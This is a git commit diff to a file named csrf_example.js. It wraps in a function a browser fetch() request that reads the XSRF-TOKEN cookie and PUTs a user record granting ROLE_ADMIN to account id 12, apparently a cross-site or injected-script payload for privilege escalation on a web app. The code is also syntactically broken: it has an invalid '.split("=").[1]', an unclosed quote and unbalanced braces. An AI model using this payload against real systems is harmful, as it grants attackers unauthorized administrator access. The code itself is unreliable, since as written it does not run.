5a7a784b0d22615e4ce55d8de1efa9a0a083e147
May PST <83545584+GrannyCat@users.noreply.github.com>
2023-11-17 02:48:31 +0630

    Update csrf_example.js

--- csrf_example.js
+++ csrf_example.js
@@ -1,21 +1,23 @@
-fetch('/api/users',
-{
-method: 'PUT',
-headers: {
-'Content-Type': application/json',
-'X-XSRF-Token': document.cookie.valueOf('XSRF-TOKEN').split("=").[1],
-},
-body:JSON.stringify({
-id:12,
-"activated" : true,
-"authorities: ["ROLE_ADMIN", "ROLE_USER"],
-login:'newuser101',
-firstName:'new101',
-lastName: 'user101',
-email:'user101@localhost',
+function executeScript() {
+  fetch('/api/users',
+  {
+    method: 'PUT',
+    headers: {
+      'Content-Type': 'application/json',
+    'X-XSRF-Token': document.cookie.valueOf('XSRF-TOKEN').split("=").[1],
+  },
+  body:JSON.stringify({
+  id:12,
+  "activated" : true,
+  "authorities: ["ROLE_ADMIN", "ROLE_USER"],
+  login:'newuser101',
+  firstName:'new101',
+  lastName: 'user101',
+  email:'user101@localhost',
 }),
 })
 .then(response =>response.text())
 .then(data=>console.log(data))
 .catch(error=>console.error('Error', error));
+}
 }
